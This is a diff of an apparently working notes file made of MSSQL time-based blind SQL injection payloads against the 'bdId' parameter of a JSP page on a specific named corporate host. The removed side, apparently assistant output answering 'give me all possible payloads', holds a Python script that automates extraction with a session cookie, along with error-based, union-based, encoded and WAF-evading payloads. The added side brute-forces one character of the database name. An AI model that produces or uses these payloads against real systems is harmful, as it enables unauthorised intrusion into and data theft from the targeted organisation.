@@ -1,209 +1,80 @@
-1. Get Database Name Length
-sql
-bdId=BD000001906' IF (LEN(DB_NAME())=[GUESS]) WAITFOR DELAY '0:0:5'--
-Try numbers 1-50 until you get a delay.
-
-2. Extract Database Name Character by Character
-sql
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),[POSITION],1))=[ASCII_VALUE]) WAITFOR DELAY '0:0:5'--
-Python script to automate:
-
-python
-import requests
-import time
-
-url = "https://frontoffice.webfarm-qa.ms.com/renovation/frontoffice/webapp/jsp/BusDefPopup.jsp"
-cookies = {"JSESSIONID": "C2DCE4E8B17467C0B9F6A5F7F6F6..."}  # Use your actual JSESSIONID
-
-db_name = ""
-position = 1
-
-while True:
-    found = False
-    for ascii_val in range(32, 127):  # Printable ASCII
-        payload = f"BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),{position},1))={ascii_val}) WAITFOR DELAY '0:0:5'--"
-        
-        start = time.time()
-        response = requests.get(url, params={"bdId": payload}, cookies=cookies, verify=False)
-        elapsed = time.time() - start
-        
-        if elapsed >= 5:
-            db_name += chr(ascii_val)
-            print(f"Database name: {db_name}")
-            found = True
-            break
-    
-    if not found:
-        break
-    position += 1
-
-print(f"Full database name: {db_name}")
-3. Alternative One-Shot Payload (if error visible)
-sql
-bdId=BD000001906' SELECT DB_NAME()--
-4. Get Current User Database
-sql
--- Get current database
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '0:0:5'--
-
--- Get all databases (requires looping)
-bdId=BD000001906' IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))=[ASCII]) WAITFOR DELAY '0:0:5'--
-5. Faster Extraction using Binary Search
-sql
--- Check if ASCII value is greater than 64
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:5'--
-Important Notes:
-The delay of 21 seconds in your example suggests the application is vulnerable
-
-URL encode special characters: ' = %27, -- = %2D%2D
-
-The parameter is already partially URL encoded (%20 for space)
-
-Use verify=False if SSL certificate issues exist
-
-Full URL Example:
-
-text
-https://frontoffice.webfarm-qa.ms.com/renovation/frontoffice/webapp/jsp/BusDefPopup.jsp?bdId=BD000001906%27%20IF%20(DB_NAME()=%27master%27)%20WAITFOR%20DELAY%20%270:0:5%27--%20
-give me all possible payloads
-Here are all possible payload types to extract the database name from this MSSQL time-based blind SQL injection:
-
-1. TIME-BASED PAYLOADS (Most Reliable)
-Get Database Name Length
-sql
-bdId=BD000001906' IF (LEN(DB_NAME())=1) WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (LEN(DB_NAME())=2) WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (LEN(DB_NAME())=3) WAITFOR DELAY '0:0:5'--
-# ... continue until 50
-Get Database Name - SUBSTRING Method
-sql
-bdId=BD000001906' IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (SUBSTRING(DB_NAME(),1,1)='b') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (SUBSTRING(DB_NAME(),1,1)='c') WAITFOR DELAY '0:0:5'--
-Get Database Name - ASCII Method
-sql
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))=65) WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))=66) WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))=67) WAITFOR DELAY '0:0:5'--
-# ASCII range: 65-90 (A-Z), 97-122 (a-z), 48-57 (0-9), 32-126 (special)
-Get Database Name - Unicode Method
-sql
-bdId=BD000001906' IF (UNICODE(SUBSTRING(DB_NAME(),1,1))=65) WAITFOR DELAY '0:0:5'--
-Get Database Name - Multiple Characters at Once
-sql
-bdId=BD000001906' IF (DB_NAME() LIKE 'S%') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME() LIKE 'SQ%') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME() LIKE 'SQL%') WAITFOR DELAY '0:0:5'--
-2. BOOLEAN-BASED PAYLOADS (If error messages visible)
-Case-Sensitive Comparison
-sql
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '0:0:5'-- 
-bdId=BD000001906' IF (DB_NAME()='model') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME()='msdb') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME()='tempdb') WAITFOR DELAY '0:0:5'--
-Case-Insensitive Comparison
-sql
-bdId=BD000001906' IF (UPPER(DB_NAME())='MASTER') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (LOWER(DB_NAME())='master') WAITFOR DELAY '0:0:5'--
-Pattern Matching
-sql
-bdId=BD000001906' IF (DB_NAME() LIKE '%db%') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME() LIKE '%prod%') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (DB_NAME() LIKE '%test%') WAITFOR DELAY '0:0:5'--
-3. ERROR-BASED PAYLOADS (If errors displayed)
-Convert Error
-sql
-bdId=BD000001906' AND 1=CONVERT(int, DB_NAME())--
-bdId=BD000001906' OR 1=CONVERT(int, DB_NAME())--
-XML Error
-sql
-bdId=BD000001906' AND 1=(SELECT DB_NAME() FOR XML PATH(''))--
-Division by Zero
-sql
-bdId=BD000001906' AND 1/(LEN(DB_NAME())-LEN(DB_NAME()))=1--
-4. UNION-BASED PAYLOADS (If column count matches)
-Extract Database Name
-sql
-bdId=BD000001906' UNION SELECT DB_NAME()--
-bdId=BD000001906' UNION ALL SELECT DB_NAME()--
-bdId=BD000001906' UNION SELECT NULL, DB_NAME()--
-bdId=BD000001906' UNION SELECT NULL, NULL, DB_NAME()--
-5. ADVANCED TIME-BASED PAYLOADS
-Binary Search Method (Faster)
-sql
--- Check if ASCII > 64
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:2'--
-
--- Check if ASCII > 96
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))>96) WAITFOR DELAY '0:0:2'--
-
--- Check if ASCII > 80
-bdId=BD000001906' IF (ASCII(SUBSTRING(DB_NAME(),1,1))>80) WAITFOR DELAY '0:0:2'--
-Waitfor with Different Delays
-sql
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '0:0:1'--
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '0:0:3'--
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '0:0:10'--
-bdId=BD000001906' IF (DB_NAME()='master') WAITFOR DELAY '00:00:05'--
-Using BENCHMARK Equivalent (MySQL style - limited)
-sql
-bdId=BD000001906' WAITFOR DELAY '0:0:'+CAST(LEN(DB_NAME()) AS VARCHAR)+'--
-6. GET ALL DATABASES (Not Just Current)
-First Database Name
-sql
-bdId=BD000001906' IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name),1,1))=65) WAITFOR DELAY '0:0:5'--
-Nth Database Name
-sql
-bdId=BD000001906' IF (ASCII(SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY),1,1))=65) WAITFOR DELAY '0:0:5'--
-All Databases with Row Number
-sql
-bdId=BD000001906' IF (ASCII(SUBSTRING((SELECT name FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) AS rn FROM sys.databases) t WHERE rn=3),1,1))=65) WAITFOR DELAY '0:0:5'--
-7. URL-ENCODED PAYLOADS (Ready to use)
-sql
-# Space encoded as %20
-bdId=BD000001906%27%20IF%20(DB_NAME()=%27master%27)%20WAITFOR%20DELAY%20%270:0:5%27--
-
-# Space encoded as + 
-bdId=BD000001906%27+IF+(DB_NAME()=%27master%27)+WAITFOR+DELAY+%270:0:5%27--
-
-# Double URL encode
-bdId=BD000001906%2527%2520IF%2520(DB_NAME()=%2527master%2527)%2520WAITFOR%2520DELAY%2520%25270:0:5%2527--
-
-# Unicode encoded
-bdId=BD000001906%u0027%u0020IF%u0020(DB_NAME()=%u0027master%u0027)%u0020WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027--
-8. OBFUSCATED PAYLOADS (Avoid WAF)
-Case Variation
-sql
-bdId=BD000001906' iF (Db_NaMe()='master') wAiTfOr DeLaY '0:0:5'--
-Comments Inside Keywords
-sql
-bdId=BD000001906' IF/**/(DB_NAME()='master')/**/WAITFOR/**/DELAY/**/'0:0:5'--
-Using Different Comparison Operators
-sql
-bdId=BD000001906' IF (DB_NAME() IN ('master')) WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF EXISTS(SELECT 1 WHERE DB_NAME()='master') WAITFOR DELAY '0:0:5'--
-bdId=BD000001906' IF (SELECT DB_NAME())='master' WAITFOR DELAY '0:0:5'--
-Using Mathematical Operations
-sql
-bdId=BD000001906' IF (1= CASE WHEN DB_NAME()='master' THEN 1 ELSE 0 END) WAITFOR DELAY '0:0:5'-
-
-
-Step-3: (Optional)
-Then enumerate the database length.
-#MySQL Payload
-'%2b(select*from(select(IF(LENGTH(DATABASE())<10,SLEEP(5),FALSE)))a)%2b'
-#MSSQL Payload
-'; IF (LEN(DB_NAME()) < 10) WAITFOR DELAY '00:00:05'--
-Step-4:
-Then match the database length by equal to condition
-#MySQL Payload
-'%2b(select*from(select(IF(LENGTH(DATABASE())=10,SLEEP(5),FALSE)))a)%2b'
-#MSSQL Payload
-'; IF (LEN(DB_NAME()) = 10) WAITFOR DELAY '00:00:05'--
-Step-5:
-Then enumerate the database name using LIKE condition
-#MySQL Payload
-'%2b(select*from(select(IF(DATABASE()%20LIKE%20'a%',SLEEP(5),FALSE)))a)%2b'
-#MSSQL Payload
-'; IF (DB_NAME() LIKE 'a%') WAITFOR DELAY '00:00:10'--
-database name supported characters
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='A') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='B') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='C') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='D') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='E') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='F') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='G') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='H') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='I') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='J') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='K') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='L') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='M') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='N') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='O') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='P') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='Q') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='R') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='S') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='T') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='U') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='V') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='W') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='X') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='Y') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='Z') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='0') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='1') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='2') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='3') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='4') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='5') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='6') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='7') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='8') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='9') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='_') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='-') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='$') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (SUBSTRING(DB_NAME(),2,1)='#') waitfor delay' 0:0:5 ' --
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=48) waitfor delay' 0:0:5 ' -- (0)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=49) waitfor delay' 0:0:5 ' -- (1)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=50) waitfor delay' 0:0:5 ' -- (2)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=51) waitfor delay' 0:0:5 ' -- (3)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=52) waitfor delay' 0:0:5 ' -- (4)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=53) waitfor delay' 0:0:5 ' -- (5)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=54) waitfor delay' 0:0:5 ' -- (6)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=55) waitfor delay' 0:0:5 ' -- (7)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=56) waitfor delay' 0:0:5 ' -- (8)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=57) waitfor delay' 0:0:5 ' -- (9)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=65) waitfor delay' 0:0:5 ' -- (A)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=66) waitfor delay' 0:0:5 ' -- (B)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=67) waitfor delay' 0:0:5 ' -- (C)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=68) waitfor delay' 0:0:5 ' -- (D)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=69) waitfor delay' 0:0:5 ' -- (E)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=70) waitfor delay' 0:0:5 ' -- (F)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=71) waitfor delay' 0:0:5 ' -- (G)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=72) waitfor delay' 0:0:5 ' -- (H)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=73) waitfor delay' 0:0:5 ' -- (I)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=74) waitfor delay' 0:0:5 ' -- (J)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=75) waitfor delay' 0:0:5 ' -- (K)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=76) waitfor delay' 0:0:5 ' -- (L)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=77) waitfor delay' 0:0:5 ' -- (M)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=78) waitfor delay' 0:0:5 ' -- (N)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=79) waitfor delay' 0:0:5 ' -- (O)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=80) waitfor delay' 0:0:5 ' -- (P)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=81) waitfor delay' 0:0:5 ' -- (Q)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=82) waitfor delay' 0:0:5 ' -- (R)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=83) waitfor delay' 0:0:5 ' -- (S)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=84) waitfor delay' 0:0:5 ' -- (T)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=85) waitfor delay' 0:0:5 ' -- (U)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=86) waitfor delay' 0:0:5 ' -- (V)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=87) waitfor delay' 0:0:5 ' -- (W)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=88) waitfor delay' 0:0:5 ' -- (X)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=89) waitfor delay' 0:0:5 ' -- (Y)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=90) waitfor delay' 0:0:5 ' -- (Z)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=95) waitfor delay' 0:0:5 ' -- (_)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=97) waitfor delay' 0:0:5 ' -- (a)
+bdId=BD00000380006097576  IF (ASCII(SUBSTRING(DB_NAME(),2,1))=98) waitfor delay' 0:0:5 ' -- (b)
+...through 122 (z)
